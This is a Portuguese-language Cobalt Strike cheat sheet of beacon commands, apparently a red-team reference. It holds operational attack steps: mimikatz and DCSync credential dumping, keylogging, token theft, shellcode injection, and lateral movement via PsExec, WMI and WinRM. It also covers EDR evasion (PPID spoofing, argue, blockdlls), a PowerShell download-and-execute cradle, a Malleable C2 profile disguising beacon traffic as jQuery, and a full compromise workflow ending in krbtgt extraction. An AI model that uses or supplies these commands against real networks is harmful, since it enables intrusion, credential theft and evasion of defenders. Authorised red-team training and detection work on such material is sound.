---
layout: cyber
section: cheatsheets
title: "Cobalt Strike — Cheatsheet Completo"
---

# Cobalt Strike — Cheatsheet Completo

> Referência rápida de comandos Cobalt Strike organizados por categoria.
> Todos os comandos são executados dentro do beacon, exceto quando indicado como "Aggressor".

---

## Tabela de Listeners

| Tipo | Protocolo | Porta Padrão | Uso | Quando Usar |
|------|-----------|-------------|-----|-------------|
| HTTP | HTTP | 80 | Beacon padrão | Ambientes sem inspeção de tráfego |
| HTTPS | TLS | 443 | Beacon padrão criptografado | Maioria dos engajamentos — tráfego mistura com web normal |
| DNS | DNS A/TXT/MX | 53 | Canal lento, altamente evasivo | Firewalls restritivos, apenas DNS liberado |
| SMB | Named Pipe | — | Pivot entre hosts internos | Movimento lateral, hosts sem acesso à internet |
| TCP | TCP direto | Qualquer | Pivot / bind beacon | Redes segmentadas, conexão controlada |
| External C2 | Qualquer | — | Via Havoc/Sliver integração | Customização total do protocolo |

**DNS Beacon — notas:**
- Extremamente lento (dezenas de bytes por requisição)
- Difícil de bloquear (DNS raramente é bloqueado)
- Configurar DNS no Malleable C2 ou usar listener DNS integrado
- Requer zona DNS delegada para o C2: `*.c2.attacker.com → C2_IP`

**SMB Beacon — notas:**
- Beacon de stage conecta via named pipe a outro beacon (pivoting)
- Não faz conexão de rede direta — usa host intermediário como proxy
- Pipe name padrão: `\\.\pipe\msagent_*` (customizar no Malleable C2)
- `link TARGET \\TARGET\pipe\nome` para conectar

---

## Navegação e Sistema de Arquivos

```bash
# Listagem e navegação
ls                          # Listar diretório atual
ls C:\Users\               # Listar diretório específico
pwd                         # Diretório atual
cd C:\Windows\Temp         # Mudar diretório
mkdir C:\Temp\nova_pasta   # Criar diretório
rm C:\Temp\arquivo.txt     # Deletar arquivo
cp origem destino          # Copiar arquivo
mv origem destino          # Mover/renomear arquivo
cat C:\Windows\win.ini     # Ler conteúdo de arquivo

# Transferência de arquivos
upload /local/path/arquivo.exe      # Enviar arquivo do operador para o beacon
download C:\path\arquivo.txt        # Baixar arquivo do beacon para o operador
# Os downloads ficam em: CS Team Server → View → Downloads

# Drives e armazenamento
drives                      # Listar drives disponíveis
```

---

## Execução de Comandos

```bash
# Execução de comandos OS
shell whoami                         # Via cmd.exe (gera processo filho cmd.exe)
shell net user /domain               # Comando com argumentos
shell "net localgroup administrators" # Com aspas

# run — executa sem shell wrapper (usa CreateProcess diretamente)
run whoami                           # Sem cmd.exe intermediário — menos detectável
run net use \\server\share /user:dom\user pass

# execute — executa e não espera resultado (fire and forget)
execute calc.exe                     # Abre processo, beacon não espera

# PowerShell
powershell Get-Process               # PowerShell simples
powershell -c "Get-ADUser -Filter *" # Com parâmetro
powershell IEX (New-Object Net.WebClient).DownloadString('http://IP/script.ps1')

# Importar script PowerShell e chamar funções
powershell-import /caminho/local/PowerView.ps1
powershell Get-DomainUser -SPN      # Usar função do script importado

# execute-assembly — executa .NET assembly em memória (sem tocar em disco)
execute-assembly /local/path/Rubeus.exe triage
execute-assembly /local/path/SharpHound.exe --CollectionMethods All
execute-assembly /local/path/Certify.exe find /vulnerable
execute-assembly /local/path/Seatbelt.exe -group=all
execute-assembly /local/path/SharpView.exe Get-DomainUser -SPN
execute-assembly /local/path/WinPEAS.exe
```

---

## Reconhecimento (Post-Ex)

```bash
# Informações do processo e host
getuid              # Usuário atual (domain\user)
getpid              # PID do processo do beacon
ps                  # Listar todos os processos (PID, PPID, nome, usuário, sessão)
sysinfo             # Informações do sistema (OS, hostname, domínio)

# Escalada de privilégio
getsystem           # Tentar escalar para SYSTEM (múltiplas técnicas)
# getsystem usa: Named Pipe Impersonation, Token Duplication, etc.

# Rede
net view            # Hosts visíveis na rede
net computers       # Computadores no domínio (requer domínio)
net dclist          # Domain Controllers
net share           # Compartilhamentos locais
net sessions        # Sessões SMB ativas (ver quem está conectado)
net localgroup      # Grupos locais
net user            # Usuários locais
net use             # Conexões de rede mapeadas
net logons          # Usuários logados

# Domínio
net domain          # Nome do domínio atual
net domain_trusts   # Trusts de domínio
net group           # Grupos de domínio
net time            # Servidor de tempo (geralmente é o DC)

# Informações detalhadas do ambiente
shell nltest /domain_trusts /all_trusts   # Trusts
shell ipconfig /all                        # Rede detalhada
shell netstat -ano                         # Conexões ativas
shell tasklist /svc                        # Processos e serviços
shell reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run  # Autorun
```

---

## Credenciais

```bash
# Dump de credenciais locais
hashdump            # Dump do SAM local (hashes NT de contas locais) — requer SYSTEM

# DCSync — extrair hashes do AD replicando o DC (requer DA ou DCSync rights)
dcsync DOMAIN.COM user.alvo      # DCSync de usuário específico
dcsync DOMAIN.COM domain\krbtgt  # Extrair hash do krbtgt (para Golden Ticket)

# Mimikatz integrado no Cobalt Strike
logonpasswords       # sekurlsa::logonpasswords — credenciais em memória
# Com Credential Guard ativo: não retornará NTLM hashes, mas pode retornar tickets

# Mimikatz direto (via módulo)
mimikatz sekurlsa::logonpasswords
mimikatz lsadump::sam
mimikatz lsadump::dcsync /domain:DOMAIN.COM /user:krbtgt
mimikatz kerberos::list /export
mimikatz vault::list
mimikatz vault::cred /patch

# Keylogger (captura keystrokes do usuário no processo alvo)
keylogger           # Inicia keylogger no processo atual
keylogger PID       # Inicia keylogger em outro processo
# Ver resultado: View → Keystrokes

# Screenshot
screenshot          # Captura tela do usuário
# Ver resultado: View → Screenshots

# Browsing por credenciais
shell cmdkey /list  # Credenciais salvas do Windows Credential Manager
shell reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" # RDP salvo
```

---

## Manipulação de Tokens

```bash
# make_token — cria token de rede com credenciais (LogonType 9 — NewCredentials)
# Útil para: acessar recursos de rede como outro usuário sem ter shell como esse usuário
make_token DOMAIN\user password
# Após: comandos de rede usam o novo token, mas processos locais ainda são o usuário original
# Verificar: getuid (mostra token ativo)

# steal_token — rouba token de processo existente
steal_token PID     # Roubar token do PID especificado
# Útil: roubar token de processo de usuário privilegiado que está logado no host

# rev2self — voltar ao token original (reverter steal_token ou make_token)
rev2self

# getuid — ver usuário/token atual
getuid

# Fluxo típico de uso de token:
ps                              # Ver processos e donos
steal_token 1234               # Roubar token de processo como DOMAIN\admin
getuid                          # Confirmar token roubado
shell net use \\DC\C$ /u:...  # Opções de rede como admin
rev2self                        # Restaurar token original
```

---

## Kerberos

```bash
# Usar ticket Kerberos exportado externamente
# Converter kirbi para formato usável:
kerberos_ticket_use /caminho/local/ticket.kirbi   # Injeta ticket na sessão

# Usar ccache (de Impacket ou de outro beacon)
kerberos_ccache_use /caminho/local/ticket.ccache  # Usa ccache

# Limpar tickets Kerberos da sessão atual
kerberos_ticket_purge

# Listar tickets da sessão atual
shell klist

# Fluxo completo PTT:
# 1. No Kali: extrair ticket com Rubeus ou impacket
# 2. Upload do ticket kirbi para o beacon
upload /kali/path/ticket.kirbi
# 3. Usar o ticket
kerberos_ticket_use C:\Windows\Temp\ticket.kirbi
# 4. Verificar
shell klist
# 5. Acessar recurso
shell dir \\DC\C$
```

---

## Injeção de Código

```bash
# inject — injetar shellcode no PID especificado
inject PID x64              # Injetar shellcode em processo x64
inject PID x86              # Injetar shellcode em processo x86
# Shellcode usado é o do listener configurado no beacon atual

# shinject — injetar shellcode arbitrário
shinject PID x64 /caminho/shellcode.bin    # Shellcode customizado x64
shinject PID x86 /caminho/shellcode.bin    # Shellcode customizado x86

# dllinject — injetar DLL em processo
dllinject PID /caminho/payload.dll

# Verificar antes de injetar:
ps                          # Ver processos disponíveis
getuid                      # Verificar permissão atual

# Processo alvo recomendado para injeção:
# - Processo de longa duração (svchost, explorer, chrome)
# - Processo com mesmo usuário (sem necessidade de escalada)
# - Processo não-monitorado pelo EDR
```

---

## Spawn / Geração de Novos Beacons

```bash
# spawn — criar novo beacon no processo spawnto configurado
spawn x64               # Criar beacon x64 (usa spawnto configurado)
spawn x86               # Criar beacon x86
spawn x64 LISTENER      # Criar beacon em listener específico

# spawnas — criar beacon como outro usuário
spawnas DOMAIN\user password LISTENER   # Novo beacon com credenciais

# spawnto — configurar processo alvo para novos spawns (OPSEC)
spawnto x64 %windir%\sysnative\svchost.exe   # Usar svchost como host de beacon
spawnto x86 %windir%\syswow64\svchost.exe
spawnto x64 %windir%\sysnative\notepad.exe

# spawnu — criar beacon sob PID pai específico (PPID spoofing)
spawnu PID LISTENER     # Criar beacon com PID como parent (parent spoofing)
# Exemplo: spawnu 4 x64 — beacon parece filho do System

# Verificar spawnto atual:
# Settings → Beacon Configuration
```

---

## Movimento Lateral

```bash
# jump — executar beacon em host remoto via vários métodos
jump psexec   TARGET LISTENER    # PSExec (cria serviço, SMB, admin$)
jump psexec64 TARGET LISTENER    # PSExec 64-bit
jump psexec_psh TARGET LISTENER  # PSExec via PowerShell (mais stealthy)
jump winrm    TARGET LISTENER    # WinRM (porta 5985, PowerShell remoting)
jump winrm64  TARGET LISTENER    # WinRM 64-bit
jump wmi      TARGET LISTENER    # WMI (DCOM, sem serviço criado — stealthy)

# remote-exec — executar comando em host remoto sem criar beacon
remote-exec wmi    TARGET "command here"   # Via WMI
remote-exec psexec TARGET "command here"   # Via PSExec
remote-exec winrm  TARGET "command here"   # Via WinRM

# Conectar a SMB beacon existente em host alvo
link TARGET \\TARGET\pipe\nome_pipe   # Conectar via named pipe SMB

# Conectar a TCP beacon bind
connect TARGET PORT               # Conectar via TCP

# Exemplos práticos:
# Com token roubado de admin:
steal_token 1234
jump wmi 10.10.10.50 LISTENER_HTTPS    # Spawn via WMI como admin
rev2self

# Com make_token:
make_token DOMAIN\admin Password123
jump winrm64 10.10.10.60 LISTENER_SMBB
rev2self
```

---

## Pivoting e Tunelamento

```bash
# SOCKS proxy — criar SOCKS4a/SOCKS5 no team server
socks 1080              # SOCKS4a na porta 1080 do team server
socks 1080 socks5       # SOCKS5
socks 1080 socks5 enableNoAuth   # SOCKS5 sem autenticação
socks stop              # Parar SOCKS proxy

# Configurar proxychains no Kali para usar:
# /etc/proxychains4.conf: socks4 TEAMSERVER_IP 1080

# Port forwarding
portfwd add -l 4444 -r 10.10.10.50 -p 445  # Encaminhar porta local 4444 → remoto:445
portfwd add -l 8080 -r 10.10.10.50 -p 80   # Encaminhar 8080 → alvo:80
portfwd list                                 # Listar regras ativas
portfwd remove -l 4444                       # Remover regra

# CovertVPN — criar adaptador de rede virtual para pivoting de camada 2
# (requer admin no beacon)
covertvpn eth0          # Criar interface de rede no Kali que se comunica via beacon

# rportfwd — reverse port forward (do beacon para team server)
rportfwd 8080 127.0.0.1 80    # Porta 8080 no beacon aponta para localhost:80 no CS

# Uso típico de SOCKS para movimento lateral:
socks 1080
# No Kali:
# proxychains cme smb 10.10.10.0/24 -u admin -p pass --shares
# proxychains psexec.py DOMAIN/admin:pass@10.10.10.50
# proxychains impacket-secretsdump DOMAIN/admin:pass@10.10.10.50
```

---

## Configurações Pós-Exploração

```bash
# Sleep e jitter — controlar frequência de check-in (OPSEC)
sleep 60            # Check-in a cada 60 segundos
sleep 60 20         # 60 segundos + 20% jitter (entre 48s e 72s)
sleep 3600 30       # 1 hora + 30% jitter (comunicação mais discreta)
sleep 0             # Modo interativo (check-in contínuo — muito barulhento)

# Configurações de post-ex (requerem versão adequada do CS)
# Configurar via Malleable C2 ou via comandos:

# argue — adicionar argumentos falsos ao processo para enganar análise de linha de comando
argue "C:\Windows\system32\notepad.exe C:\Users\Public\report.txt"
# Processo malicioso aparece com argumentos legítimos no EDR

# blockdlls — bloquear DLLs não-Microsoft nos processos filhos (evitar hooks do EDR)
blockdlls start    # Ativar blockdlls para spawns subsequentes
blockdlls stop     # Desativar

# ppid — configurar PPID spoofing para processos filhos
ppid 4             # Processos filhos terão System (PID 4) como parent
ppid 1234          # Usar PID específico como parent

# Verificar configuração atual do beacon
sysinfo
```

---

## Geração de Payloads

### Via GUI (Cobalt Strike Team Client)

```
Attacks → Packages:
- Windows Executable        → .exe do staged payload
- Windows Executable (S)    → .exe do stageless payload (melhor OPSEC)
- HTML Application          → .hta (execução via Internet Explorer/mshta)
- MS Office Macro           → VBA macro para inserir em documento
- Payload Generator         → Raw shellcode (.bin) para uso customizado

Attacks → Web Drive-by:
- Scripted Web Delivery     → One-liner PowerShell, Python, regsvr32 para staging
- Manage                    → Gerenciar hosts web ativos
```

### Via Aggressor Script (CLI/Automatizado)

```javascript
// Gerar shellcode raw via API do Cobalt Strike:
$artifactkit = artifact_payload("x64", "exe", $listener);
// Salvar em arquivo

// Gerar payload via stageless:
$stageless = artifact_payload("x64", "exe_stageless", $listener);
```

### Via agscript (linha de comando)

```bash
# Executar script Aggressor via linha de comando
java -jar /path/to/cobaltstrike.jar \
    TEAMSERVER_IP PORT user password \
    /path/to/script.cna
```

---

## Aggressor Script Básico

Aggressor é a linguagem de scripting do Cobalt Strike (baseada em Sleep).

```javascript
// Arquivo: customized.cna

// Atalho de teclado para script
bind Ctrl+J {
    prompt_text("Comando personalizado:", "whoami", lambda({
        binput($1, "shell $2");
        bshell($1, $2);  // $1 = beacon ID, $2 = resposta do usuário
    }, $1 => $1));
}

// Menu de contexto no beacon
popup beacon_top {
    item "Quick Recon" {
        local('%bids');
        foreach $bid (keys($bids)) {
            bpowershell($bid, "Get-ComputerInfo | Select-Object *");
        }
    }
}

// Evento ao conectar beacon
on beacon_initial {
    local('$bid');
    $bid = $1;
    binput($bid, "[*] Novo beacon! Host: " . binfo($bid, "computer"));
    bshell($bid, "whoami && hostname && ipconfig /all");
}

// Carregar assembly .NET
sub execAssembly {
    local('$bid $path $args');
    ($bid, $path, $args) = @_;
    execute_assembly($bid, $path, $args);
}

// Inicializar alias
alias recon {
    bshell($1, "whoami && hostname && net user /domain && ipconfig /all");
}
```

**Carregar .cna no cliente Cobalt Strike:**
```
Cobalt Strike → Script Manager → Load → selecionar arquivo .cna
```

---

## Malleable C2 — Conceitos Básicos

Malleable C2 permite customizar completamente o tráfego de rede do beacon.

```
# Exemplo básico de perfil Malleable C2
set sleeptime "5000";       # 5 segundos
set jitter "20";             # 20% jitter
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/jquery-3.6.0.min.js";
    
    client {
        header "Host" "cdnjs.cloudflare.com";
        header "Accept" "*/*";
        header "Referer" "https://legitimate-site.com/";
        
        metadata {
            base64url;
            prepend "jQuery_";
            header "Cookie";
        }
    }
    
    server {
        header "Content-Type" "application/javascript";
        header "Cache-Control" "max-age=31536000";
        
        output {
            prepend "/*! jQuery v3.6.0 | (c) JS Foundation */";
            base64url;
            append ";";
            print;
        }
    }
}

http-post {
    set uri "/jquery-3.6.0.min.map";
    
    client {
        header "Content-Type" "application/octet-stream";
        
        id {
            mask;
            base64url;
            header "X-Request-ID";
        }
        
        output {
            mask;
            base64url;
            print;
        }
    }
    
    server {
        header "Content-Type" "application/json";
        output {
            print;
        }
    }
}
```

**Validar perfil:**
```bash
./c2lint profile.malleable
```

---

## Fluxo Completo de Engajamento Típico

```bash
# 1. Configurar listener HTTPS com certificado legítimo
# Team Server → Listeners → Add → HTTPS, porta 443, domínio com cert Let's Encrypt

# 2. Gerar payload stageless
# Attacks → Packages → Windows Executable (S) → x64 → Output: exe

# 3. Obfuscar payload antes de entregar (ThreatCheck + Freeze ou Donut)
# ThreatCheck: verificar detecção
# Freeze: converter para shellcode com stub customizado

# 4. Entregar payload (phishing, USB, exploit, etc.)

# 5. Ao receber beacon — reconhecimento inicial automático
sysinfo
getuid
ps
shell nltest /domain_trusts

# 6. Configurar sleep para operação discreta
sleep 600 25   # 10 min + 25% jitter

# 7. Escalada local se necessário
getsystem
# ou executar: execute-assembly SharpUp.exe audit

# 8. Dump inicial de credenciais
logonpasswords
hashdump

# 9. Reconhecimento de AD
execute-assembly SharpHound.exe --CollectionMethods All --Domain domain.com
download C:\Windows\Temp\BloodHound_*.*

# 10. Movimento lateral
steal_token PID_admin
jump wmi 10.10.10.50 HTTPS_LISTENER

# 11. DCSync quando tiver DA
dcsync DOMAIN.COM DOMAIN\krbtgt
```
